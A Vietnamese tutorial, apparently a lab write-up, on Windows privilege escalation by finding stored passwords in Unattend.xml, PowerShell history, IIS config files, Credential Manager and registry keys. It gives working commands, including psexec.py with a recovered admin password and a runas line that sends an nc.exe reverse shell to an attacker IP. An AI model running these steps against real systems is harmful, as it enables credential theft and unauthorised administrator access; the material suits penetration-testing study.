# Password Hunting
Đối với những ví dụ này, chúng tôi đã có được chỗ đứng trên mục tiêu Windows 10 với tư cách là người dùng tiêu chuẩn bob .

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/954a7dc3-9f70-4107-a058-1a31a9ac8ec7)

## Password Hunting – Unattend.xml
### Manual Enumeration
Có một số vị trí đã biết nơi chúng tôi có thể tìm kiếm tệp Unattend.xml hoặc sysprep.xml trên hệ thống tệp.
Cần đề cập rằng tệp cũng có thể được đặt tên **sysprep.xml** , mà chúng ta cũng nên tìm nếu không tìm thấy tệp Unattend.xml.
- C:\unattend.xml
- **C:\Windows\Panther\Unattend.xml**
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.xml
- C:\Windows\system32\sysprep\sysprep.xml
Vị trí phổ biến nhất mà chúng ta sẽ tìm thấy tệp Unattend.xml nằm trong thư mục **C:\Windows\Panther**
Kiểm tra thư mục C:\Windows\Panther\ trên nạn nhân, chúng tôi tìm thấy file Unattend.xml!
```
dir C:\Windows\Panther
```

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0d2c9b80-bf24-4e39-b0ba-30568c69b1c3)

### Automated Enumeration – PowerUp and winPEAS
Sau khi tải xuống công cụ ta có phai đẩy sang máy nạn nhân

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/5fed1944-cb5c-419a-a048-98f29de3fffa)

Với cả hai công cụ trên nạn nhân, chúng ta có thể bắt đầu bằng cách thực thi PowerUp.ps1 trước winPEASx64.exe vì nó tìm kiếm chiến thắng nhanh chóng và kết quả đầu ra ít hơn FAR.

Chúng ta có thể truy cập lời nhắc PowerShell bằng lệnh powershell -ep bypass rồi tải PowerUp.ps1 vào phiên hiện tại bằng cách sử dụng dấu chấm. Từ đó, chúng ta có thể sử dụng PowerUp để thực hiện tất cả các bước kiểm tra cấu hình sai/lỗ hổng bảo mật cùng một lúc, như sau:
```
. .\PowerUp.ps1
Invoke-AllChecks
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/66dd6588-5ae0-42ce-b563-18c3f00b371f)

Cuộn xuống, chúng ta sẽ thấy rằng PowerUp kiểm tra tệp Unattend.xml ở những vị trí phổ biến, điều đó có nghĩa là nó có thể tìm thấy tệp này cho chúng ta!

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/5028a6e4-1935-470b-a4c3-f4e2e03aca5d)

Vì chúng tôi đã chuyển winPEAS trên nạn nhân nên chúng tôi có thể tiến hành quét toàn bộ (không có công tắc) và sau đó rà soát đầu ra để tìm xem có dịch vụ nào dễ bị tổn thương do quyền yếu hay không.

Vì winPEAS có rất nhiều đầu ra nên điều quan trọng là biết thông tin nhất định sẽ nằm ở đâu. Đối với tệp Unattend.xml, tôi muốn kiểm tra phần **Interesting files and registry** .

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/39533836-1caf-4e06-a1f5-a9cd7df808fe)

Ở đây chúng ta có thể thấy rằng winPEAS thậm chí còn trích xuất giá trị mật khẩu từ tệp cho chúng ta!

### Extracting and Decoding the Administrator Password
Bây giờ chúng ta đã biết cách tìm tệp Unattend.xml nếu nó tồn tại trên hệ thống và tùy thuộc vào phương pháp chúng ta đã sử dụng để tìm nó, chúng ta có thể trích xuất mật khẩu. Nếu chúng tôi sử dụng liệt kê thủ công hoặc PowerUp để tìm tệp này thì chúng tôi sẽ cần trích xuất mật khẩu theo cách thủ công bằng cách đọc qua tệp.
```
more C:\Windows\Panther\Unattend.xml
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/374b475a-9617-455a-acc3-0a7d4985245e)

Ở đây chúng ta có thể thấy rằng mật khẩu người dùng Quản trị viên được lưu trữ trong tệp và nó không được lưu trữ trong bản rõ. Điều này có nghĩa là thông tin đăng nhập đang được lưu trữ trong base64.

Ngoài ra, nếu chúng tôi đã sử dụng winPEAS, nó sẽ trích xuất mật khẩu được mã hóa base64 này cho chúng tôi.

Bây giờ chúng ta đã có mật khẩu từ file Unattend.xml, chúng ta cần giải mã nó. Để thực hiện việc này, chúng ta có thể sao chép chuỗi base64 và sau đó giải mã nó trên máy tấn công của mình bằng lệnh sau:
```
echo 'TABvAGMAYQBsAEEAZABtAGkAbgBQAGEAcwBzAHcAbwByAGQAMQAhAA==' | base64 --decode
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/bf1f0c2a-946e-4266-8b6c-a2d9b2e35bd4)

Tôi đã dễ dàng giải mã được mật khẩu.

Bây giờ chúng ta đã tìm thấy mật khẩu quản trị viên cục bộ, tùy thuộc vào những gì đang mở, chúng ta có thể dễ dàng lấy được quản trị viên hoặc shell HỆ THỐNG trên nạn nhân. Trong ví dụ này, cổng 445 đang mở (thường có trên các máy Windows) nên chúng tôi có thể sử dụng một công cụ tuyệt vời có tên psexec.py để lấy shell Hệ THỐNG cho nạn nhân.
```
psexec.py Administrator:'LocalAdminPassword1!'@172.16.1.250
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/1d9be2a1-4208-4c8b-896a-9e76af804d0d)

## Password Hunting – PowerShell History File
### Manual Enumeration

Có một vị trí tiêu chuẩn nơi tệp lịch sử PowerShell sẽ được đặt cho mỗi người dùng:
- %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Ở đây chúng ta thấy “%userprofile%” đang được sử dụng cho người dùng hiện tại, đó là bob và do đó sẽ dịch sang vị trí sau:
- C:\Users\bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Bây giờ chúng ta đã biết nơi tìm tệp lịch sử PowerShell, chúng ta có thể dễ dàng trích xuất nội dung của tệp bằng lệnh **more** hoặc **type** .
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Ngoài ra, từ lời nhắc PowerShell, chúng tôi có thể trích xuất nội dung của tệp lịch sử PowerShell bằng lệnh sau:
```
cat (Get-PSReadlineOption).HistorySavePath
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/681a44df-16ae-4672-8da2-91fb0b996cdd)

Ở đây chúng ta có thể thấy rằng người dùng đã sử dụng PowerShell trước đây và một tệp lịch sử đã được tạo. Ngoài ra, chúng ta có thể thấy từ các lệnh do người dùng đưa ra rằng họ đã cố gắng sử dụng lệnh **runas** không chính xác với thông tin xác thực của Quản trị viên.

### Automated Enumeration – winPEAS
Sử dụng các công cụ chúng tôi không nhận được nhiều thông tin về tệp lịch sử PowerShell; ví dụ: chúng tôi chỉ nhận được thông tin về việc tệp có tồn tại hay không khi sử dụng winPEAS.
PowerUp không kiểm tra sự tồn tại của tệp lịch sử PowerShell.

Khi chúng ta chạy winPEAS, ở đầu đầu ra là phần **System Information** . Nếu cuộn xuống một chút, chúng ta sẽ tìm thấy một phần phụ dành cho **Cài đặt PowerShell** . Từ đây chúng ta có thể biết người dùng có file lịch sử PowerShell hay không cũng như dung lượng của file đó.

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/3e0ad62f-9dca-47f1-a80d-39e6318f281e)

Nếu chúng tôi nhận thấy rằng người dùng có tệp lịch sử PowerShell khi sử dụng winPEAS, chúng tôi sẽ cần trích xuất nội dung của tệp theo cách thủ công như chúng tôi đã làm trước đó, sau đó xem qua đầu ra để tìm bất kỳ phát hiện quan trọng nào.

Vì chúng tôi đã tìm thấy mật khẩu Quản trị viên trong tệp nên chúng tôi có thể tiến hành lấy lại shell đảo ngược với tư cách là Quản trị viên bằng cách sử dụng lại psexec.py hoặc cách khác, tùy thuộc vào dịch vụ nào đang chạy trên nạn nhân.

## Password Hunting – IIS Config and Web Files
Đối với máy chủ web IIS, webroot nằm trong thư mục **C:\inetpub\wwwroot** , đây là nơi chúng ta có thể tìm thấy các tệp thú vị chứa thông tin xác thực trong đó.

Cụ thể, chúng tôi muốn tìm tệp **web.config** và/hoặc tệp **Connectionstrings.config** .

Tệp web.config là tệp cấu hình dựa trên XML được sử dụng trong các ứng dụng dựa trên ASP .NET để quản lý các cài đặt khác nhau liên quan đến cấu hình của trang web. Thông thường, chúng tôi sẽ tìm thấy thông tin xác thực trong các tệp này để cấu hình dễ dàng (lười).

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/49c42640-738c-45e3-a4e4-b15922f1d4dc)

Kiểm tra nội dung file web.config trước tiên chúng ta tìm được mật khẩu quản trị viên!

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/69f68ae1-dbe0-435a-b8b4-12eda7494fa4)

Nếu chúng tôi không tìm thấy thông tin xác thực trong tệp web.config, chúng tôi có thể kiểm tra tệp Connectionstrings.config – nếu nó tồn tại.

Tệp conntectionstrings.config thường được sử dụng với SQL nên bạn có thể chỉ tìm thấy tệp này nếu nhận thấy máy có máy chủ SQL.

Kiểm tra nội dung của tệp Connectionstrings.config, chúng tôi tìm thấy thông tin xác thực và kết nối của người dùng **sa** cho cơ sở dữ liệu, cho biết rằng chúng tôi có thể sử dụng các thông tin xác thực này để đăng nhập vào cơ sở dữ liệu và hy vọng nhận được HỆ THỐNG hoặc tài khoản dịch vụ.

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/89203009-a9ec-4ae3-a690-5c26e6eb542b)

Ngoài ra, vì chúng tôi đã tìm thấy mật khẩu, chúng tôi nên thêm mật khẩu này vào danh sách mật khẩu và kiểm tra nó với những người dùng khác vì có thể sử dụng lại mật khẩu.

Vì có các tệp thú vị khác thường được gắn với máy chủ web nên có một lệnh PowerShell hữu ích mà chúng ta có thể sử dụng để tìm kiếm đệ quy các tệp thú vị cho mình, như sau:
```
Get-Childitem -Recurse C:\inetpub | findstr -i "directory config txt aspx ps1 bat xml pass user"
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2f19bcf7-6a94-4408-b586-7b54e78ce8c5)

Ở đây chúng ta có thể thấy rằng một tệp thú vị mới đã được tìm thấy trong thư mục **C:\inetpub\ftproot** có tên **user.txt** .

Chúng tôi cũng có thể chỉnh sửa lệnh trên để tìm các tệp thú vị trong thư mục C:\xampp hoặc C:\apache, tùy thuộc vào máy chủ web nào đang chạy. Với một máy chủ web khác, chúng tôi sẽ muốn loại bỏ ASPX khỏi lệnh seektr và thay thế nó bằng PHP.
```
Get-Childitem -Recurse C:\apache | findstr -i "directory config txt php ps1 bat xml pass user"
Get-Childitem -Recurse C:\xampp | findstr -i "directory config txt php ps1 bat xml pass user"
```

## Password Hunting – Stored Credentials (Credential Manager)
Việc tìm kiếm thông tin xác thực được lưu trữ có thể được thực hiện bằng một lệnh đơn giản:
```
cmdkey /list
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/a3390105-1dfb-40b4-95cc-b2a7ddd40295)

Ở đây chúng ta có thể thấy thông tin đăng nhập của tài khoản Quản trị viên cục bộ đã được lưu trữ trong Trình quản lý thông tin xác thực và có thể được sử dụng để thực thi các lệnh.

Cả PowerUp và winPEAS đều không tìm thấy điều này cho bạn. PEAS sẽ cố gắng tìm nó nhưng dường như tôi luôn thất bại nên phương pháp thủ công là tốt nhất.

Khi chúng tôi đã tìm thấy thông tin xác thực được lưu trữ của người dùng, chúng tôi có thể thực thi các lệnh với tư cách là người dùng đó bằng lệnh **runas** . Điều tuyệt vời nhất là điều này có thể thực hiện được mà không cần biết mật khẩu của họ!

Mặc dù đây không thực sự là "săn mật khẩu", nhưng nó cung cấp cho chúng tôi khả năng chạy các lệnh với tư cách một người dùng khác do mật khẩu của họ được lưu trữ. Vì vậy, nó thực sự giống như việc tìm kiếm thông tin xác thực của người dùng trên hệ thống.

Nếu chúng tôi cố gắng chạy bất kỳ lệnh tùy ý nào chẳng hạn như 'whoami' hoặc lệnh tương tự cho POC, chúng tôi sẽ cần chuyển hướng đầu ra sang một tệp để đọc nó. Điều này là do runas thực thi lệnh từ một cửa sổ riêng biệt.
```
runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "cmd.exe /c whoami > C:\temp\whoami.txt"
```

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/f07b3dba-ff8d-49a8-9d5c-4128c916bf4f)

POC cho thấy rằng chúng tôi thực sự đang chạy các lệnh với tư cách là tài khoản quản trị viên cục bộ! Bây giờ chúng ta có thể sử dụng runas để có được một shell đảo ngược. Chúng tôi có thể thực hiện việc này theo bất kỳ cách nào, nhưng trong ví dụ này, chúng tôi sẽ sử dụng **nc.exe** để đẩy shell quản trị trở lại máy tấn công của chúng tôi.

Từ ảnh chụp màn hình ở trên, nc.exe đã có trên máy nạn nhân nên chúng ta có thể sử dụng nó để đẩy shell đảo ngược với tư cách quản trị viên bằng lệnh sau:
```
runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/9e6d8bab-ebb6-40f4-8e1c-4a40bfbbab5c)

## Password Hunting – Registry Keys
### Manual Enumeration
Chúng tôi có thể thực hiện tìm kiếm rộng rãi trong sổ đăng ký để tìm tất cả các phiên bản của chuỗi 'mật khẩu' trong tổ hợp đăng ký HKLM và HKLU; tuy nhiên, điều này sẽ tạo ra RẤT NHIỀU kết quả.
```
reg query HKLM /f password /t REG_SZ /s
reg query HKLU /f password /t REG_SZ /s
```

Trước tiên kiểm tra trên máy cục bộ, chúng ta có thể thấy nó tạo ra 293 kết quả phù hợp, điều này còn rất nhiều điều phải trải qua!

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/27a399d4-14f5-47e3-93ce-85a2fe46f2bb)

Thay vào đó, chúng ta có thể tập trung vào việc nhắm mục tiêu các khóa đăng ký đã biết có chứa mật khẩu.

Khi khóa đăng ký như vậy là **winlogon** , khóa này được gắn với một cài đặt trong Windows có tên là **Autologon** .

Autologon cho phép bạn dễ dàng cấu hình cơ chế tự động đăng nhập tích hợp của Windows. Thay vì đợi người dùng nhập tên và mật khẩu của họ, Windows sử dụng thông tin xác thực bạn nhập bằng Autologon để tự động đăng nhập vào người dùng được chỉ định.

Khi tính năng tự động đăng nhập được bật, có khả năng mật khẩu đã được lưu ở dạng văn bản rõ ràng. Để tìm hiểu, chúng ta có thể truy vấn khóa đăng ký winlogon bằng lệnh sau:
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d8ca1c0f-77c7-46ea-a47e-7fc1128b10dc)

Truy vấn này cho thấy mật khẩu quản trị viên đã được lưu trữ trong sổ đăng ký không an toàn.

Ngoài tính năng Tự động đăng nhập, một số chương trình và phần mềm của bên thứ ba cũng có thể lưu trữ thông tin đăng nhập không an toàn. Dưới đây là danh sách các truy vấn khác mà chúng tôi có thể thực hiện đối với các dịch vụ lưu trữ mật khẩu đã biết:
```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```
